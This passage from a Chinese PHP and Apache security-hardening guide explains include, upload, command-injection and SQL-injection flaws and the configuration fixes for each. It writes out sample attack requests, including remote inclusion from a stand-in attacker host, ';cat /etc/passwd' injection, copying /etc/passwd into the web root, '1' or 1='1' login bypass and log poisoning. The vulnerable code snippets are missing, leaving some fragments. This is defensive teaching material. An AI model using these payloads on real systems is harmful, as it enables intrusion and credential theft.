重启 apache 后，/usr/local/apache/htdocs 目录下的 PHP 脚本就只能操作它自己目录下的文件
了，否则 PHP 就会报错：
Warning: open_basedir restriction in effect. File is in wrong directory in xxx on line xx.
使用 safe_mode 模式也能避免这种问题，前面已经讨论过了。
4、包含文件
极易受攻击的代码片断：
这种不负责任的代码会造成相当大的危害，攻击者用如下请求可以得到/etc/passwd 文件：
http://victim/test_3.php?filename=/etc/passwd
如果对于 Unix 版的 PHP（Win 版的 PHP 不支持远程打开文件）攻击者可以在自己开了 http
或 ftp 服务的机器上建立一个包含 shell 命令 的文件，http://attack/attack.txt 的内容是
，那么如下的请求就可以在目标主机执行命令 ls /etc：
http://victim/test_3.php?filename=http://attack/attack.txt
攻击者甚至可以通过包含 apache 的日志文件 access.log 和 error.log 来得到执行命令的代码，
不过由于干扰信息太多，有时不易成功。
对于另外一种形式，如下代码片断：
攻击者可以在自己的主机建立一个包含执行命令代码的 config.php 文件，然后用如下请求也
可以在目标主机执行命令：
http://victim/test_4.php?lib=http://attack
PHP 的包含函数有 include(), include_once(), require(), require_once。如果对包含文件名变量
检查不严就会对系统造成严重危险，可以远程执行命令。
解决方法：
要求程序员包含文件里的参数尽量不要使用变量，如果使用变量，就一定要严格检查要包含
的文件名，绝对不能由用户任意指定。
如前面文件打开中限制 PHP 操作路径是一个必要的选项。另外，如非特殊需要，一定要关
闭 PHP 的远程文件打开功能。修改 php.ini 文件：
allow_url_fopen = Off
重启 apache。
5、文件上传
php 的文件上传机制是把用户上传的文件保存在 php.ini 的 upload_tmp_dir 定义的临时目录
（默认是系统的临时目录， 如：/tmp）里的一个类似 phpxXuoXG 的随机临时文件，程序执
行结束，该临时文件也被删除。PHP 给上传的文件定义了四个变量：
（如 form 变量 名是 file，
而且 register_globals 打开）
$file #就是保存到服务器端的临时文件（如/tmp/phpxXuoXG ）
$file_size #上传文件的大小
$file_name #上传文件的原始名称
$file_type #上传文件的类型
推荐使用：
$HTTP_POST_FILES['file']['tmp_name']
$HTTP_POST_FILES['file']['size']
$HTTP_POST_FILES['file']['name']
$HTTP_POST_FILES['file']['type']
这是一个最简单的文件上传代码：
继续上传";
exit;
}
?>
文件上传
上传文件:
这样的上传代码存在读取任意文件和执行命令的重大问题。
下面的请求可以把/etc/passwd 文档拷贝到 web 目录/usr/local/apache/htdocs/test（注意：这个
目录必须 nobody 可写）下的 attack.txt 文件里：
http://victim/test_5.php?upload=1&file=/etc/passwd&file_name=attack.txt
然后可以用如下请求读取口令文件：
http://victim/test/attack.txt
攻击者可以把 php 文件拷贝成其它扩展名，泄漏脚本源代码。
攻击者可以自定义 form 里 file_name 变量的值，上传覆盖任意有写权限的文件。
攻击者还可以上传 PHP 脚本执行主机的命令。
解决方法：
PHP-4.0.3以后提供了 is_uploaded_file 和 move_uploaded_file 函数，可以检查操作的文件是否
是用户上传的文件，从而避免把系统文件拷贝到 web 目录。
使用$HTTP_POST_FILES 数组来读取用户上传的文件变量。
严格检查上传变量。比如不允许是 php 脚本文件。
把 PHP 脚本操作限制在 web 目录可以避免程序员使用 copy 函数把系统文件拷贝到 web 目
录。move_uploaded_file 不受 open_basedir 的限制，所以不必修改 php.ini 里 upload_tmp_dir
的值。
把 PHP 脚本用 phpencode 进行加密，避免由于 copy 操作泄漏源码。
严格配置文件和目录的权限，只允许上传的目录能够让 nobody 用户可写。
对于上传目录去掉 PHP 解释功能，可以通过修改 httpd.conf 实现：
php_flag engine off
#如果是 php3换成 php3_engine off
重启 apache，upload 目录的 php 文件就不能被 apache 解释了，即使上传了 php 文件也没有
问题，只能直接显示源码。
6、命令执行
下面的代码片断是从 PHPNetToolpack 摘出，详细的描述见：
http://www.securityfocus.com/bid/4303
由于程序没有过滤$a_query 变量，所以攻击者可以用分号来追加执行命令。
攻击者输入如下请求可以执行 cat /etc/passwd 命令：
http://victim/test_6.php?a_query=www.example.com;cat /etc/passwd
PHP 的命令执行函数还有 system(), passthru(), popen()和``等。命令执行函数非常危险，慎用。
如果要使用一定要严格检查用户输入。
解决方法：
要求程序员使用 escapeshellcmd()函数过滤用户输入的 shell 命令。
启用 safe_mode 可以杜绝很多执行命令的问题，不过要注意 PHP 的版本一定要是最新的，
小于 PHP-4.2.2的都可能绕过 safe_mode 的限制去执行命令。
7、sql_inject
如下的 SQL 语句如果未对变量进行处理就会存在问题：
select * from login where user='$user' and pass='$pass'
攻击者可以用户名和口令都输入1' or 1='1绕过验证。
不过幸亏 PHP 有一个默认的选项 magic_quotes_gpc = On，该选项使得从 GET, POST,
COOKIE 来的变量自动加了 addslashes()操作。上面 SQL 语句变成了：
select * from login where user='1\' or 1=\'1' and pass='1\' or 1=\'1'
从而避免了此类 sql_inject 攻击。
对于数字类型的字段，很多程序员会这样写：
select * from test where id=$id
由于变量没有用单引号扩起来，就会造成 sql_inject 攻击。幸亏 MySQL 功能简单，没有
sqlserver 等数据库有执行命令的 SQL 语 句，而且 PHP 的 mysql_query()函数也只允许执行
一条 SQL 语句，所以用分号隔开多条 SQL 语句的攻击也不能奏效。但是攻击者起码还可以
让查 询语句出错，泄漏系统的一些信息，或者一些意想不到的情况。
解决方法：
要求程序员对所有用户提交的要放到 SQL 语句的变量进行过滤。
即使是数字类型的字段，变量也要用单引号扩起来，MySQL 自己会把字串处理成数字。
在 MySQL 里不要给 PHP 程序高级别权限的用户，只允许对自己的库进行操作，这也避免
了程序出现问题被 SELECT INTO OUTFILE ... 这种攻击。
8、警告及错误信息
PHP 默认显示所有的警告及错误信息：
error_reporting = E_ALL & ~E_NOTICE
display_errors = On
在平时开发调试时这非常有用，可以根据警告信息马上找到程序错误所在。
正式应用时，警告及错误信息让用户不知所措，而且给攻击者泄漏了脚本 所在的物理路径，
为攻击者的进一步攻击提供了有利的信息。而且由于自己没有访问到错误的地方，反而不能
及时修改程序的错误。所以把 PHP 的所有警告及错误 信息记录到一个日志文件是非常明智
的，即不给攻击者泄漏物理路径，又能让自己知道程序错误所在。
修改 php.ini 中关于 Error handling and logging 部分内容：
error_reporting = E_ALL
display_errors = Off
log_errors = On
error_log = /usr/local/apache/logs/php_error.log
然后重启 apache，注意文件/usr/local/apache/logs/php_error.log 必需可以让 nobody 用户可写。
9、disable_functions
如果觉得有些函数还有威胁，可以设置 php.ini 里的 disable_functions（这个选项不能在
httpd.conf 里设置），比如：
disable_functions = phpinfo, get_cfg_var
可以指定多个函数，用逗号分开。重启 apache 后，phpinfo, get_cfg_var 函数都被禁止了。建
议关闭函数 phpinfo, get_cfg_var，这两个函数容易泄漏服务器信息，而且没有实际用处。
10、disable_classes
这个选项是从 PHP-4.3.2开始才有的，它可以禁用某些类，如果有多个用逗号分隔类名。
disable_classes 也不能在 httpd.conf 里设置，只能在 php.ini 配置文件里修改。
11、open_basedir
前面分析例程的时候也多次提到用 open_basedir 对脚本操作路径进行限制，这里再介绍一下
它的特性。用 open_basedir 指定的限制 实际上是前缀，不是目录名。也就是说 "open_basedir
= /dir/incl" 也会允许访问 "/dir/include" 和 "/dir/incls"，如果它们存在的话。如果要将访问
限制在仅为指定的目录，用斜线结束路径名。例如："open_basedir = /dir/incl/"。
可以设置多个目录，在 Windows 中，用分号分隔目录。在任何其它系统中用冒号分隔目录。
作为 Apache 模块时，父目录中的 open_basedir 路径自动被继承。
四、其它安全配置
1、取消其它用户对常用、重要系统命令的读写执行权限
一般管理员维护只需一个普通用户和管理用户，除了这两个用户，给其它用户能够执行和访
问的东西应该越少越好，所以取消其它用户对常用、重要系统命令 的读写执行权限能在程
序或者服务出现漏洞的时候给攻击者带来很大的迷惑。记住一定要连读的权限也去掉，否则
在 linux 下可以用/lib/ld- linux.so.2 /bin/ls 这种方式来执行。
如果要取消某程如果是在 chroot 环境里，这个工作比较容易实现，否则，这项工作还是有 些
挑战的。因为取消一些程序的执行权限会导致一些服务运行不正常。PHP 的 mail 函数需要
/bin/sh 去调用 sendmail 发信，所以/bin /bash 的执行权限不能去掉。这是一项比较累人的工
作，
2、去掉 apache 日志其它用户的读权限
apache 的 access-log 给一些出现本地包含漏洞的程序提供了方便之门。通过提交包含 PHP
代码的 URL，可以使 access-log 包含 PHP 代码，那么把包含文件指向 access-log 就可以执行
那些 PHP 代码，从而获得本地访问权限。
如果有其它虚拟主机，也应该相应去掉该日志文件其它用户的读权限。
当然，如果你按照前面介绍的配置 PHP 那么一般已经是无法读取日志文件了。